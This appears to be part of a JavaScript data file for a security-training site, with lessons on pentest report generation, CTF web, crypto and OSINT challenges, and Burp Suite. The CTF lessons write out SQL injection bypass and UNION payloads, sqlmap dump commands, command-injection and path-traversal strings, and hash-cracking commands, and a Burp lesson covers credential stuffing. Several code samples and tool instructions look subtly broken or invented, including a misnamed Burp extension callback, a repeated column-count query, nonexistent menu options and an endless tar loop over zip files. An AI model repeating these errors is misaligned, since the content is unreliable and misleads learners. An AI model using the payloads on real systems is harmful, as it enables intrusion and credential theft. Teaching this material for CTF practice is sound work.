        title: 'Module 4: Reporting',
        lessons: [
          {
            key: 'mod2_4_0',
            title: 'Generating PDF Reports',
            content:
              "Pentest reports need to look professional and be easy to navigate. Here is how to automate PDF generation.\n\n" +
              "Using reportlab:\n" +
              "from reportlab.lib.pagesizes import letter\n" +
              "from reportlab.lib import colors\n" +
              "from reportlab.lib.styles import getSampleStyleSheet\n" +
              "from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak\n\n" +
              "def create_report(findings, output='report.pdf'):\n" +
              "    doc = SimpleDocTemplate(output, pagesize=letter)\n" +
              "    styles = getSampleStyleSheet()\n" +
              "    story = []\n\n" +
              "    story.append(Paragraph(\"Penetration Test Report\", styles['Title']))\n" +
              "    story.append(Spacer(1, 20))\n\n" +
              "    story.append(Paragraph(\"Executive Summary\", styles['Heading1']))\n" +
              "    story.append(Paragraph(\n" +
              "        f\"This report documents {len(findings)} vulnerabilities identified during testing.\",\n" +
              "        styles['Normal']))\n" +
              "    story.append(Spacer(1, 20))\n\n" +
              "    table_data = [['#', 'Title', 'Severity', 'CVSS']]\n" +
              "    for i, f in enumerate(findings, 1):\n" +
              "        table_data.append([str(i), f['title'], f['severity'], f.get('cvss', 'N/A')])\n\n" +
              "    t = Table(table_data, colWidths=[30, 200, 80, 60])\n" +
              "    t.setStyle(TableStyle([\n" +
              "        ('BACKGROUND', (0, 0), (-1, 0), colors.grey),\n" +
              "        ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),\n" +
              "        ('GRID', (0, 0), (-1, -1), 1, colors.black),\n" +
              "    ]))\n" +
              "    story.append(t)\n" +
              "    doc.build(story)\n" +
              "    print(f\"Report saved to {output}\")",
          },
          {
            key: 'mod2_4_1',
            title: 'HTML Dashboard with Bootstrap',
            content:
              "HTML reports are easy to generate and share. Here is a pattern for a professional security dashboard.\n\n" +
              "Generating an HTML report:\n" +
              "import json\n" +
              "from datetime import datetime\n\n" +
              "def generate_html_report(scan_results, output='report.html'):\n" +
              "    html = f\"\"\"\n" +
              "<!DOCTYPE html>\n" +
              "<html lang=\"en\">\n" +
              "<head>\n" +
              "    <meta charset=\"UTF-8\">\n" +
              "    <title>Security Scan Report - {datetime.now().strftime('%Y-%m-%d')}</title>\n" +
              "    <link href=\"https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css\" rel=\"stylesheet\">\n" +
              "    <style>\n" +
              "        body {{ background: #1a1a2e; color: #eee; }}\n" +
              "        .card {{ background: #16213e; border: 1px solid #0f3460; }}\n" +
              "    </style>\n" +
              "</head>\n" +
              "<body class=\"p-4\">\n" +
              "    <div class=\"container\">\n" +
              "        <h2 class=\"mb-4\">Security Scan Report</h2>\n" +
              "        <p class=\"text-muted\">Generated: {datetime.now().strftime('%Y-%m-%d %H:%M')}</p>\n" +
              "        <div class=\"row mb-4\">\n" +
              "            <div class=\"col-md-4\"><div class=\"card p-3\"><h5>Total Findings</h5><h3>{len(scan_results)}</h3></div></div>\n" +
              "        </div>\n" +
              "        <table class=\"table table-dark table-striped\">\n" +
              "            <thead><tr><th>URL</th><th>Type</th><th>Severity</th><th>Description</th></tr></thead>\n" +
              "            <tbody>\n\"\"\"\n" +
              "    for r in scan_results:\n" +
              "        html += f\"<tr><td><code>{r['url']}</code></td><td>{r['type']}</td><td>{r['severity']}</td><td>{r['description'][:100]}...</td></tr>\"\n\n" +
              "    html += \"</tbody></table></div></body></html>\"\n\n" +
              "    with open(output, 'w') as f:\n" +
              "        f.write(html)\n" +
              "    print(f\"Report: {output}\")",
          },
        ],
      },
    ],
  },
  {
    id: 3,
    title: 'CTF Fundamentals — Win Your First Competition',
    description: 'A practical guide to competitive CTF. Learn the categories, tools, and thinking patterns that separate beginners from finishers.',
    instructor: 'Muhammad Aminu Musa',
    level: 'Beginner',
    duration: '6 hours',
    lessons: 15,
    image: '🚩',
    modules: [
      {
        title: 'Module 1: CTF Mindset & Categories',
        lessons: [
          {
            key: 'mod3_1_0',
            title: 'How CTF Competitions Work',
            content:
              "CTFs are puzzle competitions where you solve security challenges to earn points. Here is how to approach them.\n\n" +
              "Competition formats:\n" +
              "- Jeopardy style (most common): Pick from categories, solve challenges in any order. Points vary by difficulty.\n" +
              "- Attack-Defense: You get a server with vulnerabilities. Defend your box while attacking others'.\n" +
              "- Boot2Root: Single target, get root, submit the flag. Usually individual or small team.\n\n" +
              "Jeopardy categories (standard):\n" +
              "Web - XSS, SQLi, SSRF, IDOR, JWT, etc.\n" +
              "Crypto - Encoding, hashing, classic ciphers, modern crypto\n" +
              "Pwn - Binary exploitation (buffer overflows, ROP, etc.)\n" +
              "Reverse - Disassembling and understanding compiled programs\n" +
              "Forensics - File recovery, steganography, memory analysis, PCAP\n" +
              "OSINT - Open source intelligence (finding info online)\n" +
              "Misc - Anything that does not fit above\n\n" +
              "Time management strategy:\n" +
              "1. Scan all challenges quickly - read every description\n" +
              "2. Pick low-hanging fruit first (easy points build confidence and momentum)\n" +
              "3. Track your work in a spreadsheet\n" +
              "4. If stuck >20 minutes, switch to another challenge\n" +
              "5. Revisit hard challenges with fresh eyes after solving others\n\n" +
              "The key mindset shift: Most CTF challenges are not about discovering 0-days. They are about applying known techniques to new problems. The skill is recognizing which technique applies.",
          },
          {
            key: 'mod3_1_1',
            title: 'Reading Challenge Descriptions Carefully',
            content:
              "The challenge description contains more information than you think. Here is how to extract it.\n\n" +
              "What to look for:\n" +
              "- Title: 'Login Bypass 101'\n" +
              "- Points: 100 (tells you difficulty - low points = easier)\n" +
              "- Category: Web\n" +
              "- Description: 'A login form is misconfigured. Use classic SQLi to bypass authentication.'\n" +
              "- Hints (sometimes)\n" +
              "- Attached files: download.file (contains source code, binary, etc.)\n" +
              "- Connection info: target.com:12345 (for remote challenges)\n\n" +
              "What 'files' tells you:\n" +
              "- If a .py file is attached - read the source code, the vulnerability is in there\n" +
              "- If an executable is attached - it is a pwn or reverse challenge\n" +
              "- If a .pcap is attached - it is forensics or network analysis\n" +
              "- If a .jpg is attached - steganography\n\n" +
              "Remote vs local challenges:\n" +
              "- Local: You download a file and analyze it on your machine\n" +
              "- Remote: You connect to a service (netcat target:port) to interact with it live\n\n" +
              "For remote challenges: nc target.com 12345\n" +
              "Use 'script' to record everything: script -qf /tmp/ctf.log nc target.com 12345",
          },
        ],
      },
      {
        title: 'Module 2: Web Challenges',
        lessons: [
          {
            key: 'mod3_2_0',
            title: 'Reading PHP Source Code',
            content:
              "Many web CTFs give you source code to find the vulnerability. Here is how to read PHP quickly.\n\n" +
              "Common patterns to look for:\n\n" +
              "# SQL Injection - user input directly in query\n" +
              "$query = \"SELECT * FROM users WHERE id = \" . $_GET['id'];\n\n" +
              "# File inclusion - user input in include or require\n" +
              "include(\"pages/\" . $_GET['page'] . \".php\");\n\n" +
              "# Command injection - user input in system calls\n" +
              "system(\"ping \" . $_GET['ip']);\n\n" +
              "# XSS - user input reflected without encoding\n" +
              "echo $_GET['name'];\n\n" +
              "# Authentication bypass - weak session checks\n" +
              "if ($_COOKIE['admin'] == 'yes')\n\n" +
              "Reading a PHP source dump:\n" +
              "grep -r \"password\\|secret\\|key\\|admin\\|include\\|require\\|eval\\|system\\|exec\" index.php\n\n" +
              "The config file trap:\n" +
              "# Many CTFs put credentials in config files:\n" +
              "define('DB_USER', 'ctfuser');\n" +
              "define('DB_PASS', 'super_secret_pass_123');\n\n" +
              "PHP trick: variable variables:\n" +
              "$a = \"hello\"; $$a = \"world\"; echo $hello; // prints \"world\"",
          },
          {
            key: 'mod3_2_1',
            title: 'Basic SQL Injection Patterns',
            content:
              "SQL injection is the most common web CTF category. These are the patterns that win challenges.\n\n" +
              "Authentication bypass:\n" +
              "admin'--\n" +
              "admin' or '1'='1\n" +
              "' or 1=1--\n\n" +
              "In PHP with:\n" +
              "$query = \"SELECT * FROM users WHERE username='$user' AND password='$pass'\";\n" +
              "Enter: admin'-- as username (password does not matter)\n" +
              "Query becomes: WHERE username='admin'--' AND password='...'\n" +
              "'--' comments out the rest.\n\n" +
              "UNION injection (extract data from other tables):\n" +
              "# Find how many columns:\n" +
              "' UNION SELECT 1,2,3-- -\n\n" +
              "# When you know column count:\n" +
              "' UNION SELECT 1,2,3-- -\n\n" +
              "# Replace numbers with data:\n" +
              "' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -\n\n" +
              "# Get users table:\n" +
              "' UNION SELECT 1,username,password FROM users-- -\n\n" +
              "Automated with SQLMap:\n" +
              "# Capture a request in Burp > save as request.txt\n" +
              "sqlmap -r request.txt --batch --dbs\n" +
              "sqlmap -r request.txt -D ctfdb -T flags --dump",
          },
          {
            key: 'mod3_2_2',
            title: 'JavaScript Deobfuscation',
            content:
              "CTF web challenges often hide payloads in obfuscated JavaScript. Here is how to decode it.\n\n" +
              "Reading minified JS:\n" +
              "grep -o 'eval.*' script.js\n" +
              "grep -o 'document\\[.*\\]' script.js\n" +
              "grep -o 'String.fromCharCode.*' script.js\n\n" +
              "Common obfuscation techniques:\n\n" +
              "# 1. String char codes\n" +
              "eval(String.fromCharCode(97,108,101,114,116))\n\n" +
              "# 2. Hex encoding\n" +
              "eval(\"\\\\x61\\\\x6c\\\\x65\\\\x72\\\\x74\")\n\n" +
              "# 3. Base64\n" +
              "atob(\"YWxlcnQoMSk=\")  // alert(1)\n\n" +
              "# 4. JSFuck (only 6 chars: []()!+)\n" +
              "# Decode with: https://jsfuck.com/\n\n" +
              "Quick deobfuscation in browser:\n" +
              "1. Open DevTools > Console\n" +
              "2. Paste the obfuscated code\n" +
              "3. Replace eval with console.log to see what it evaluates to\n" +
              "4. Or set a breakpoint before the eval and inspect the string\n\n" +
              "Regex for extracting hidden data:\n" +
              "Match base64 strings: /[A-Za-z0-9+/=]{20,}/g\n" +
              "Match URLs: /https?:\\/\\/[^\\s\"]+/g\n" +
              "Find interesting patterns: /secret|password|key|flag|token/i",
          },
        ],
      },
      {
        title: 'Module 3: Crypto Basics',
        lessons: [
          {
            key: 'mod3_3_0',
            title: 'Encoding: Base64, Hex, ROT13',
            content:
              "Crypto challenges often start with encoded data. Here is the decoding toolkit.\n\n" +
              "Base64:\n" +
              "echo \"c2VjY3JldA==\" | base64 -d  # decode\n" +
              "echo \"secret\" | base64          # encode\n\n" +
              "Python:\n" +
              "import base64\n" +
              "base64.b64decode(\"c2VjY3JldA==\")\n" +
              "base64.b64encode(b\"secret\")\n\n" +
              "Hex (ASCII hex):\n" +
              "echo \"736563726574\" | xxd -r -p  # decode\n" +
              "echo \"secret\" | xxd -p           # encode\n\n" +
              "Python:\n" +
              "bytes.fromhex(\"736563726574\").decode()  # 'secret'\n" +
              "\"secret\".encode().hex()                  # '736563726574'\n\n" +
              "ROT13 (Caesar cipher with shift 13):\n" +
              "echo \"uryyb\" | tr 'A-Za-z' 'N-ZA-Mn-za-m'\n\n" +
              "Multi-layer encoding (very common in CTFs):\n" +
              "Data is often encoded multiple times:\n" +
              "base64(hex(rot13(data)))\n\n" +
              "To decode, figure out the order. Start from the inside and work out.\n\n" +
              "Cyberchef (the CTF crypto tool): https://gchq.github.io/CyberChef/\n" +
              "Recipe for multi-layer decode: From_Base64 > From_Hex > ROT13",
          },
          {
            key: 'mod3_3_1',
            title: 'Identifying & Cracking Hashes',
            content:
              "Hashes look random but are deterministic. Identify the type, then crack it.\n\n" +
              "Common hash formats:\n" +
              "MD5:     5f4dcc3b5aa765d61d8327deb882cf99 (32 hex chars)\n" +
              "SHA1:    5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8 (40 hex chars)\n" +
              "SHA256:  2c26b46b68ffc698ffbca6a3f28f71a3247eeda7... (64 hex chars)\n\n" +
              "Identifying hash type by length:\n" +
              "32 chars - MD5 or MD4\n" +
              "40 chars - SHA1\n" +
              "64 chars - SHA256\n\n" +
              "Cracking with hashcat:\n" +
              "hashcat -m 0   # MD5\n" +
              "hashcat -m 100  # SHA1\n" +
              "hashcat -m 1400 # SHA256\n\n" +
              "Wordlist attack:\n" +
              "hashcat -m 0 -a 0 hash.txt wordlist.txt\n\n" +
              "Rule-based attack (best for variations):\n" +
              "hashcat -m 0 -a 0 hash.txt wordlist.txt -j \"c $\"\n\n" +
              "Cracking with John:\n" +
              "john --wordlist=rockyou.txt hash.txt\n" +
              "john --format=raw-md5 hash.txt\n\n" +
              "The number one trick:\n" +
              "Check if the hash appears in a public leak database first!\n" +
              "https://haveibeenpwned.com/ (API available)\n" +
              "Or just Google the hash.",
          },
          {
            key: 'mod3_3_2',
            title: 'XOR Basics',
            content:
              "XOR is a fundamental operation in CTF crypto challenges. Understanding it is essential.\n\n" +
              "What XOR does:\n" +
              "0 XOR 0 = 0\n" +
              "1 XOR 1 = 0\n" +
              "0 XOR 1 = 1\n" +
              "1 XOR 0 = 1\n\n" +
              "Simple rule: outputs 1 when inputs differ.\n\n" +
              "Why it is used in CTFs:\n" +
              "- XOR with a single byte key encrypts data simply\n" +
              "- If you know part of the plaintext, you can recover the key\n" +
              "- Many 'custom encryption' schemes in CTF are just XOR\n\n" +
              "XOR in Python:\n" +
              "def xor(data, key):\n" +
              "    return bytes([b ^ key for b in data])\n\n" +
              "# Example:\n" +
              "encrypted = xor(b\"secret\", 0x41)  # XOR with 'A'\n" +
              "decrypted = xor(encrypted, 0x41)   # XOR again to decrypt\n\n" +
              "Recovering XOR key when you know plaintext:\n" +
              "# key[position] = ciphertext[position] XOR plaintext[position]\n\n" +
              "Breaking repeating-key XOR:\n" +
              "Use hamming distance to guess key length. The key length with the lowest normalized hamming distance between chunks is likely correct.\n\n" +
              "Then break each byte position independently using frequency analysis.",
          },
        ],
      },
      {
        title: 'Module 4: OSINT for CTFs',
        lessons: [
          {
            key: 'mod3_4_0',
            title: 'Google Dorking for CTF OSINT',
            content:
              "OSINT challenges are about finding publicly available information that reveals something hidden.\n\n" +
              "Google dorking syntax:\n" +
              "site:target.com          - restrict to domain\n" +
              "filetype:pdf             - find file types\n" +
              "intitle:\"secret\"         - page title contains\n" +
              "inurl:admin              - URL contains\n" +
              "\"password\" site:target.com - specific phrase on domain\n\n" +
              "Combinations for CTF:\n" +
              "site:github.com \"target.com\" password\n" +
              "site:pastebin.com \"api_key\"\n" +
              "filetype:log \"error\" \"target.com\"\n" +
              "intitle:\"Index of\" \"backup\"\n\n" +
              "Wayback Machine (web.archive.org):\n" +
              "See what a site looked like in the past. Especially useful for deleted files, old credentials, and historical vulnerability pages.\n\n" +
              "Shodan (shodan.io):\n" +
              "Find exposed services:\n" +
              "product:\"Apache\" country:\"NG\"  (web servers in Nigeria)\n" +
              "port:22 country:\"NG\"            (SSH servers)\n" +
              "product:\"MongoDB\" unauthenticated\n\n" +
              "Practical CTF OSINT workflow:\n" +
              "Given a company name and a flag format hint:\n" +
              "1. Find associated domains and IPs (DNS records, passive DNS, crt.sh certificates)\n" +
              "2. Find exposed documents (Google dorking, GitHub search)\n" +
              "3. Find employee names and email patterns (LinkedIn, company website staff list)\n" +
              "4. Find historical exposure (Wayback machine, compromised database searches)",
          },
          {
            key: 'mod3_4_1',
            title: 'Metadata Extraction from Files',
            content:
              "Files you download in CTFs often contain hidden information in their metadata.\n\n" +
              "Common metadata sources:\n" +
              "Images: GPS coordinates, camera model, software used, timestamps\n" +
              "Documents: Author name, company, last saved by, edit history\n" +
              "PDFs: Creator, creation date, embedded files\n" +
              "ZIPs: File names inside, tool that created the archive\n" +
              "Executables: Compile timestamp, debug symbols, imports and exports\n\n" +
              "Tools:\n\n" +
              "ExifTool (best for images):\n" +
              "exiftool photo.jpg\n" +
              "exiftool -gps:* photo.jpg  (just GPS data)\n\n" +
              "Strings (for any file):\n" +
              "strings target.bin | grep -i \"password\\|secret\\|key\\|flag\"\n" +
              "strings target.bin | tail -50\n\n" +
              "Binwalk (for embedded files):\n" +
              "binwalk firmware.bin       (find embedded files)\n" +
              "binwalk -e firmware.bin     (extract everything)\n\n" +
              "Steganography (hidden data in images):\n" +
              "binwalk image.jpg        (look for appended data)\n" +
              "steghide extract -sf image.jpg\n" +
              "zsteg image.png\n\n" +
              "When metadata points to another challenge:\n" +
              "CTF OSINT is a chain - metadata from one file might give you a password for another challenge, a name to search for, or coordinates that reveal a URL hidden in the metadata.",
          },
          {
            key: 'mod3_4_2',
            title: 'Finding Hidden Files',
            content:
              "CTF challenges often hide files that are not obvious. Here is how to find everything.\n\n" +
              "In a ZIP or Archive:\n" +
              "unzip -l archive.zip\n" +
              "7z l archive.zip\n\n" +
              "Check for nested archives:\n" +
              "binwalk archive.zip\n" +
              "# If binwalk finds another ZIP inside, extract and repeat\n\n" +
              "PNG images often contain hidden data:\n" +
              "pngcheck image.png\n" +
              "zsteg image.png (best for LSB stego)\n" +
              "tail -c 10000 image.jpg (last 10KB of image)\n\n" +
              "File type tricks:\n" +
              "# A file might be misnamed:\n" +
              "file suspicious.pdf\n" +
              "# If it is really a ZIP:\n" +
              "mv suspicious.pdf s.zip && unzip s.zip\n\n" +
              "Look for file signatures:\n" +
              "PNG: 89 50 4E 47\n" +
              "ZIP: 50 4B 03 04\n" +
              "PDF: 25 50 44 46\n" +
              "JPG: FF D8 FF\n\n" +
              "Recursive extraction pattern:\n" +
              "while true; do\n" +
              "    find . -type f \\( -name \"*.zip\" -o -name \"*.tar\" -o -name \"*.gz\" \\) -exec echo \"Found: {}\" \\; -exec tar -xzf {} \\;\n" +
              "    sleep 1\n" +
              "done",
          },
        ],
      },
    ],
  },
  {
    id: 4,
    title: 'Burp Suite Mastery',
    description: 'Go beyond Repeater and Intruder. Full guide to active scanning, macro-based testing, JWT manipulation, and custom extensions.',
    instructor: 'Muhammad Aminu Musa',
    level: 'Intermediate – Advanced',
    duration: '10 hours',
    lessons: 22,
    image: '🔍',
    modules: [
      {
        title: 'Module 1: Proxy Deep Dive',
        lessons: [
          {
            key: 'mod4_1_0',
            title: 'Scoped Rules & Intercept Filtering',
            content:
              "Mastering the Proxy tab is the foundation of efficient web testing. Here is what most people miss.\n\n" +
              "Setting proper scope:\n" +
              "Right-click request > Add to scope\n" +
              "Or: Target > Scope > Add include and exclude patterns\n\n" +
              "Include regex examples:\n" +
              "^https://target\\.com.*\n" +
              "^http://api\\.target\\.com.*\n\n" +
              "Exclude (for noise reduction):\n" +
              ".*\\.css$\n" +
              ".*\\.js$\n" +
              ".*\\.png$\n" +
              ".*google-analytics.*\n\n" +
              "Intercept options:\n" +
              "- Options tab > Intercept Client Requests: match rules determine which requests are paused\n" +
              "- Add rules for: Form submissions, API calls, WebSocket messages\n\n" +
              "Key proxy settings:\n" +
              "- Intercept responses based on server response (not just requests)\n" +
              "- Automatically update Content-Length (for modified request bodies)\n" +
              "- Unsubscribe from hidden domains (prevents intercepting third-party requests)\n" +
              "- Follow redirections (handle 301/302 without stopping)\n\n" +
              "Match and Replace:\n" +
              "Automatically modify requests and responses as they pass through:\n" +
              "- Add a header to every request\n" +
              "- Replace responses (hide tech fingerprint)\n" +
              "- Remove security headers to test clickjacking\n\n" +
              "Proxy history filtering:\n" +
              "Ctrl+F in proxy history searches request and response",
          },
          {
            key: 'mod4_1_1',
            title: 'Client-Side TLS Certificates & HTTP Domains',
            content:
              "Some targets use client certificates or reside on non-standard HTTP ports. Here is how to handle them.\n\n" +
              "Installing Burp CA certificate:\n" +
              "1. In browser: http://burpsuite/cert\n" +
              "2. Save the certificate\n" +
              "3. Browser settings > Privacy > Certificates > Import\n" +
              "4. Select Websites trust level\n\n" +
              "Client certificate authentication:\n" +
              "Proxy > Options > TLS PassThrough > Add client certificate (.p12 with private key)\n\n" +
              "Non-standard HTTP ports:\n" +
              "Proxy > Options > Add > Binding tab:\n" +
              "- Bind to port: 9999\n" +
              "- Bind to address: loopback only\n\n" +
              "Invisible HTTPS (non-standard ports that require TLS):\n" +
              "Proxy > Options > TLS PassThrough:\n" +
              "- Enable Support invisible HTTPS redirection\n" +
              "- Add rules for domains that use non-standard HTTPS ports\n\n" +
              "If cert errors occur, add the domain to:\n" +
              "Proxy > Options > TLS PassThrough > Never check client certificates",
          },
        ],
      },
      {
        title: 'Module 2: Active Scanning',
        lessons: [
          {
            key: 'mod4_2_0',
            title: 'Scan Coverage & Configuration',
            content:
              "Active scanning finds vulnerabilities by sending modified requests. Here is how to configure it properly.\n\n" +
              "Scan types:\n" +
              "Passive: Only observes traffic through proxy (no modifications)\n" +
              "Active: Sends attack payloads to discover vulnerabilities\n" +
              "JavaScript: Parses and analyzes client-side JS for issues\n\n" +
              "Scan configuration:\n" +
              "Target > Site map > right-click:\n" +
              "- Scope: what to scan\n" +
              "- Insertion points (where to inject payloads): URL params, body params, headers, cookies, URL file path segments\n" +
              "- Scan speed: Conservative / Normal / Thorough / Intrusive\n\n" +
              "What each scanner module checks:\n" +
              "SQL Injection: Tries ', \", ), '; tests error-based, boolean, time-based\n" +
              "XSS: Reflected parameters in HTML, JS context, attribute context\n" +
              "Path Traversal: ../../../etc/passwd variations\n" +
              "Command Injection: ;ls, &&ls, |ls, `ls`\n" +
              "CSRF: Detects state-changing actions without anti-CSRF tokens\n\n" +
              "Best practice: Scan last, test first.\n" +
              "Manual testing to understand the app, then targeted active scan on specific endpoints.",
          },
          {
            key: 'mod4_2_1',
            title: 'False Positive Management',
            content:
              "Active scanners generate noise. Here is how to separate real findings from false positives.\n\n" +
              "Verifying each finding before reporting:\n" +
              "1. Look at the actual payload sent\n" +
              "2. Look at the actual response received\n" +
              "3. Ask: does this actually make the app behave differently?\n\n" +
              "Common false positives:\n" +
              "- Scanner detects XSS but the payload is HTML-encoded in the response\n" +
              "- Path traversal found but app returns 404 for the file\n" +
              "- SQL Injection in a non-functional parameter (the app ignores it)\n\n" +
              "Reproducing manually:\n" +
              "Take the payload Burp sent, replay in Repeater.\n" +
              "If you see the raw <script> tag in the response, it is likely real.\n" +
              "If you see &lt;script&gt;, it is being encoded (likely not exploitable).\n\n" +
              "Test with a unique marker:\n" +
              "<script>alert(UNIQUE_TEST_12345)</script>\n" +
              "If the page alerts (XSS executes), it is real.\n" +
              "If you see the script tag rendered as text, it is reflected but not executable.\n\n" +
              "Burp Confirm feature:\n" +
              "Right-click issue > Do a live scan\n" +
              "Burp sends a safe probe to verify the finding.",
          },
          {
            key: 'mod4_2_2',
            title: 'Scan Scheduling & Automation',
            content:
              "You can schedule scans to run during off-peak hours or integrate them into your workflow.\n\n" +
              "Scheduling scans:\n" +
              "Burp Professional allows scheduling scans to run at specific times, resume interrupted scans, and run scans in background while you manually test other targets.\n\n" +
              "Target > Site map > right-click > Schedule active scan\n\n" +
              "Use Burp REST API to trigger scans:\n" +
              "curl -X POST \"http://127.0.0.1:1337/v0.1/scan\" \\\n" +
              "  -H \"Content-Type: application/json\" \\\n" +
              "  -d '{\"urls\": [\"https://target.com/api\"]}'\n\n" +
              "Managing scan results:\n" +
              "- Export findings: Burp > Dashboard > Scan information > Export issues\n" +
              "- Filter by severity\n" +
              "- Group by type or URL\n" +
              "- Set status: New > Confirmed > Fixed > Verified\n\n" +
              "Best practice: Scan last, test first.\n" +
              "Active scanning is loud and slow. Better approach:\n" +
              "1. Manual testing to understand the app\n" +
              "2. Passive scan to capture all traffic\n" +
              "3. Targeted active scan on specific endpoints\n" +
              "4. Save full scans for when you need comprehensive coverage.",
          },
        ],
      },
      {
        title: 'Module 3: Intruder Advanced',
        lessons: [
          {
            key: 'mod4_3_0',
            title: 'Pitchfork Mode for Credential Stuffing',
            content:
              "Intruder's Pitchfork mode lets you test multiple credential combinations simultaneously.\n\n" +
              "Pitchfork vs Sniper vs Cluster bomb:\n" +
              "Sniper: 1 position, 1 wordlist (testing one param)\n" +
              "Pitchfork: Multiple positions, each gets its own list (1-to-1 pairing)\n" +
              "Cluster bomb: Multiple positions, each gets its own list (full cartesian product)\n\n" +
              "Credential stuffing with Pitchfork:\n" +
              "POST /api/login with {\"username\":\"USER\",\"password\":\"PASS\"}\n\n" +
              "In Intruder:\n" +
              "Mark USER position > payload set 1 = usernames.txt\n" +
              "Mark PASS position > payload set 2 = passwords.txt\n\n" +
              "Pitchfork matches line 1 of userlist with line 1 of passlist.\n" +
              "Line 2 with line 2, etc.\n\n" +
              "Use case: test known credential pairs (username matches password)\n\n" +
              "Cluster bomb for mass combinations:\n" +
              "Use cluster bomb when you have 10 usernames and 10 passwords = 100 combinations (full cartesian).\n" +
              "Great for brute force when you know username and need to try many passwords.\n\n" +
              "Always check terms of service and rate limiting.\n" +
              "Some apps lock accounts after 3 failed attempts.",
          },
          {
            key: 'mod4_3_1',
            title: 'Grep Extracts & Data Extraction',
            content:
              "Intruder's grep functionality lets you extract data from responses automatically.\n\n" +
              "Setting up grep for extraction:\n" +
              "1. Send request to Intruder\n" +
              "2. Positions > clear all > mark only the part you want to extract\n" +
              "3. Payload set = null (no payloads, just position for extraction)\n" +
              "4. Options > Grep - Extract > Add > define start and end boundaries\n\n" +
              "Example: Extract CSRF tokens from responses\n" +
              "Start: '<input name=\"csrf\" value=\"'\n" +
              "End: '\"'>'\n\n" +
              "Using extracted values in subsequent requests:\n" +
              "Options > Grep - Extract > Add\n" +
              "Then in the actual request, use the extracted value in the marked position.\n\n" +
              "Payload type: Recursive grep:\n" +
              "For pages that require a token to proceed:\n" +
              "1. Set position where token goes in request\n" +
              "2. Payload type: Recursive grep\n" +
              "3. Payload set 1: Initial request to get token (URL: the form page)\n" +
              "4. Payload set 2: Grep match - extract token from response\n" +
              "5. Use this as the payload for the marked position\n\n" +
              "Useful for: CSRF-protected forms, session-rotating endpoints, any endpoint requiring valid session plus token combination.",
          },
          {
            key: 'mod4_3_2',
            title: 'Macros for Multi-Step Flows',
            content:
              "Macros let you automate multi-step sequences before each Intruder request. Essential for testing authenticated endpoints.\n\n" +
              "Setting up a macro:\n" +
              "1. Proxy > Options > Macros > Record macro\n" +
              "2. Walk through the steps manually:\n" +
              "   a. GET /login (receives session cookie)\n" +
              "   b. POST /auth (validates credentials)\n" +
              "   c. GET /dashboard (authenticated)\n" +
              "3. Stop recording\n" +
              "4. Configure which parameters are dynamic (session cookie auto-handled, CSRF tokens use extracted values)\n" +
              "5. Test the macro to ensure it works\n\n" +
              "Macro will replay all steps before each Intruder request.\n" +
              "Ensures your request always has a valid session.\n\n" +
              "Handling dynamic tokens:\n" +
              "1. GET /form > extract value from response\n" +
              "2. POST /submit > use the extracted value in the request\n" +
              "3. Mark the token position\n" +
              "4. Payload type: Extracted from macro step 1\n\n" +
              "Session handling rules:\n" +
              "Tools > Session Handling > Session handling rules > Add\n" +
              "Configure scope, set which macro to run, set how Burp handles invalid sessions.",
          },
        ],
      },
      {
        title: 'Module 4: Extender',
        lessons: [
          {
            key: 'mod4_4_0',
            title: 'Writing BApp Store Extensions',
            content:
              "Burp extensions let you automate anything. The Python API is the most accessible for security researchers.\n\n" +
              "Setting up:\n" +
              "1. Extender > Add > Python (Jython required)\n" +
              "2. Download Jython standalone JAR from jython.org\n" +
              "3. Extender > Options > Python Environment > Select JAR\n" +
              "4. Restart Burp\n\n" +
              "Basic Burp Python extension skeleton:\n" +
              "from burp import IBurpExtender, ITab\n\n" +
              "class BurpExtender(IBurpExtender, ITab):\n" +
              "    def registerBurpCallbacks(self, callbacks):\n" +
              "        self.callbacks = callbacks\n" +
              "        self.helpers = callbacks.getHelpers()\n" +
              "        callbacks.addSuiteTab(self)\n" +
              "        callbacks.registerHttpListener(self)\n" +
              "        print(\"Extension loaded!\")\n\n" +
              "    def processHttpMessage(self, toolName, isRequest, messageInfo):\n" +
              "        if isRequest:\n" +
              "            pass  # Modify requests before they are sent\n" +
              "        else:\n" +
              "            pass  # Analyze responses\n\n" +
              "Common extension tasks:\n" +
              "- Auto-find and highlight sensitive data in responses\n" +
              "- Add custom scan checks\n" +
              "- Passive scan findings (runs on all traffic)\n" +
              "- Modify request and response on the fly\n\n" +
              "Community BApps worth installing:\n" +
              "ActiveScanPlusPlus, BurpBounty, Turbo Intruder, JSON Web Tokens, Param Miner",
          },
          {
            key: 'mod4_4_1',
            title: 'Jython Setup & Python Extensions',
            content:
              "Jython lets you write Burp extensions in Python instead of Java. Here is how to set it up.\n\n" +
              "Installing Jython:\n" +
              "wget https://repo1.maven.org/maven2/org/python/jython-standalone/2.7.3/jython-standalone-2.7.3.jar\n\n" +
              "Configure in Burp:\n" +
              "Extender > Options > Python Environment\n" +
              "Browse > select jython-standalone-2.7.3.jar\n" +
              "Click Load Python Environment\n\n" +
              "Minimal Python extension example:\n" +
              "from burp import IBurpExtender\n\n" +
              "class BurpExtender(IBurpExtender):\n" +
              "    def registerBurpCallbacks(self, callbacks):\n" +
              "        callbacks.setExtensionName(\"My Python Extension\")\n" +
              "        print(\"Python extension loaded successfully!\")\n" +
              "        callbacks.registerHttpListener(self)\n\n" +
              "    def processHttpMessage(self, toolName, isRequest, messageInfo):\n" +
              "        pass\n\n" +
              "Testing your extension:\n" +
              "1. Load the .py file in Extender > Add > Select file\n" +
              "2. Check the Output tab for print statements\n" +
              "3. Any exceptions shown in Errors tab\n" +
              "4. If it crashes Burp, the error trace helps debug",
          },
          {
            key: 'mod4_4_2',
            title: 'Calling Burp APIs from Python',
            content:
              "The full Burp API lets you do almost anything programmatically. Here are the most useful patterns.\n\n" +
              "Working with the Site map:\n" +
              "siteMap = callbacks.getSiteMap(None)  # None = all\n\n" +
              "for entry in siteMap:\n" +
              "    url = entry.getUrl()\n" +
              "    if \"api\" in str(url):\n" +
              "        print(url.toString())\n\n" +
              "Custom active scan checks:\n" +
              "from burp import IScannerCheck\n\n" +
              "class CustomScanner(IScannerCheck):\n" +
              "    def doPassiveScan(self, httpService, requestInfo):\n" +
              "        issues = []\n" +
              "        response = requestInfo.getResponse()\n" +
              "        if response:\n" +
              "            body = self.helpers.bytesToString(response)\n" +
